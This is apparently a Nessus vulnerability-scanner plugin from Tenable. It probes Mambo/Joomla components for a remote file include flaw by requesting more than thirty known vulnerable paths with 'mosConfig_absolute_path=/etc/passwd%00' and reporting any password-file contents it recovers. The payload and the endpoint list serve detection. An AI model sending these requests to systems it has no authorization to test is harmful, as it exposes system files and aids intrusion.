#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
remote file include attacks. 

Description :

The remote host contains a third-party Mambo / Joomla component or
module. 

The version of at least one such component or module installed on the
remote host fails to sanitize input to the 'mosConfig_absolute_path'
parameter before using it to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://milw0rm.com/exploits/1959
http://www.securityfocus.com/archive/1/439035/30/0/threaded
http://www.securityfocus.com/archive/1/439451/30/0/threaded
http://www.securityfocus.com/archive/1/439618/30/0/threaded
http://www.securityfocus.com/archive/1/439963/30/0/threaded
http://www.securityfocus.com/archive/1/439997/30/0/threaded
http://packetstormsecurity.org/0607-exploits/smf.txt
http://milw0rm.com/exploits/2020
http://milw0rm.com/exploits/2023
http://milw0rm.com/exploits/2029
http://www.securityfocus.com/archive/1/440881/30/0/threaded
http://www.milw0rm.com/exploits/2083
http://www.securityfocus.com/archive/1/441533/30/0/threaded
http://www.securityfocus.com/archive/1/441538/30/0/threaded
http://www.securityfocus.com/archive/1/441541/30/0/threaded
http://www.milw0rm.com/exploits/2089
http://isc.sans.org/diary.php?storyid=1526
http://www.milw0rm.com/exploits/2125
http://www.milw0rm.com/exploits/2196
http://www.milw0rm.com/exploits/2205
http://www.milw0rm.com/exploits/2206
http://www.milw0rm.com/exploits/2207
http://www.milw0rm.com/exploits/2214
http://www.securityfocus.com/archive/1/444425/30/0/threaded
http://milw0rm.com/exploits/2367
http://milw0rm.com/exploits/2613

Solution :

Disable PHP's 'register_globals' setting or contact the product's
author to see if an upgrade exists.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description)
{
  script_id(22049);
  script_version("$Revision: 1.44 $");

  script_cve_id(
    "CVE-2006-3396", 
    "CVE-2006-3530", 
    "CVE-2006-3556", 
    "CVE-2006-3748", 
    "CVE-2006-3749", 
    "CVE-2006-3750", 
    "CVE-2006-3751", 
    "CVE-2006-3773",
    "CVE-2006-3947", 
    "CVE-2006-3949",
    "CVE-2006-3980",
    "CVE-2006-3995",
    "CVE-2006-4074",
    "CVE-2006-4130",
    "CVE-2006-4195",
    "CVE-2006-4270",
    "CVE-2006-4288",
    "CVE-2006-4553",
    "CVE-2006-4858"
  );
  script_bugtraq_id(18705, 18808, 18876, 18919, 18924, 18968, 18991, 19037, 19042, 19044, 19047, 19100, 19217, 19222, 19223, 19224, 19233, 19373, 19465, 19505, 19574, 19581, 19725, 20018, 20667);
  if (defined_func("script_xref"))
  {
    script_xref(name:"OSVDB", value:"27010");
    script_xref(name:"OSVDB", value:"27653");
    script_xref(name:"OSVDB", value:"27650");
    script_xref(name:"OSVDB", value:"27651");
    script_xref(name:"OSVDB", value:"27652");
    script_xref(name:"OSVDB", value:"27656");
    script_xref(name:"OSVDB", value:"28111");
    script_xref(name:"OSVDB", value:"28112");
    script_xref(name:"OSVDB", value:"28113");
  }

  script_name(english:"Mambo / Joomla Component / Module mosConfig_absolute_path Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using Mambo / Joomla components and modules");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Vulnerable scripts.
# - components.
ncoms = 0;
com = make_array();
# -   A6MamboCredits
com[ncoms++] = "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php";
# -   Art*Links
com[ncoms++] = "/components/com_artlinks/artlinks.dispnew.php";
# -    Community Builder
com[ncoms++] = "/administrator/components/com_comprofiler/plugin.class.php";
# -   Coppermine Photo Gallery
com[ncoms++] = "/components/com_cpg/cpg.php";
# -   ExtCalendar
com[ncoms++] = "/components/com_extcalendar/extcalendar.php";
# -   Galleria
com[ncoms++] = "/components/com_galleria/galleria.html.php";
# -   Hashcash
com[ncoms++] = "/components/com_hashcash/server.php";
# -   HTMLArea3
com[ncoms++] = "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php";
# -   JD-Wiki
com[ncoms++] = "/components/com_jd-wiki/lib/tpl/default/main.php";
# -   Link Directory
com[ncoms++] = "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php";
# -   LoudMouth
com[ncoms++] = "/components/com_loudmouth/includes/abbc/abbc.class.php";
# -   Mambatstaff
com[ncoms++] = "/components/com_mambatstaff/mambatstaff.php";
# -   MambelFish
com[ncoms++] = "/administrator/components/com_mambelfish/mambelfish.class.php";
# -   Mambo Gallery Manager
com[ncoms++] = "/administrator/components/com_mgm/help.mgm.php";
# -   Mosets Tree
com[ncoms++] = "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php";
# -   Multibanners
com[ncoms++] = "/administrator/components/com_multibanners/extadminmenus.class.php";
# -   PCCookbook
com[ncoms++] = "/components/com_pccookbook/pccookbook.php";
# -   Peoplebook
com[ncoms++] = "/administrator/components/com_peoplebook/param.peoplebook.php";
# -   perForms
com[ncoms++] = "/components/com_performs/performs.php";
# -   phpShop
com[ncoms++] = "/administrator/components/com_phpshop/toolbar.phpshop.html.php";
# -   PollXT
com[ncoms++] = "/administrator/components/com_pollxt/conf.pollxt.php";
# -   Remository
com[ncoms++] = "/administrator/components/com_remository/admin.remository.php";
# -   rsGallery
com[ncoms++] = "/components/com_rsgallery2/rsgallery2.php";
com[ncoms++] = "/components/com_rsgallery2/rsgallery2.html.php";
# -   Security Images
com[ncoms++] = "/administrator/components/com_securityimages/configinsert.php";
com[ncoms++] = "/administrator/components/com_securityimages/lang.php";
# -   Serverstat
com[ncoms++] = "/administrator/components/com_serverstat/install.serverstat.php";
# -   SiteMap
com[ncoms++] = "/components/com_sitemap/sitemap.xml.php";
# -   SMF Forum
com[ncoms++] = "/components/com_smf/smf.php";
# -   User Home Pages
com[ncoms++] = "/administrator/components/com_uhp/uhp_config.php";
com[ncoms++] = "/administrator/components/com_uhp2/footer.php";
# -   VideoDB
com[ncoms++] = "/administrator/components/com_videodb/core/videodb.class.xml.php";
# - modules.
nmods = 0;
mod = make_array();
# -   MambWeather
com[ncoms++] = "/modules/MambWeather/Savant2/Savant2_Plugin_options.php";


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
info = "";
contents = "";
foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  for (i=0; i<ncoms; i++)
  {
    req = http_get(
      item:string(
        dir, com[i], "?",
        "mosConfig_absolute_path=", file
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + com[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;

  for (i=0; i<nmods; i++)
  {
    req = http_get(
      item:string(
        dir, "/modules/", mod[i], "?",
        "mosConfig_absolute_path=", file
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + "/modules/" + mod[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;
}

if (info)
{
  if (contents)
    info = string(
      info,
      "\n",
      "And here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "The following scripts(s) are vulnerable :\n",
    "\n",
    info
  );

  security_warning(port:port, data:report);
}
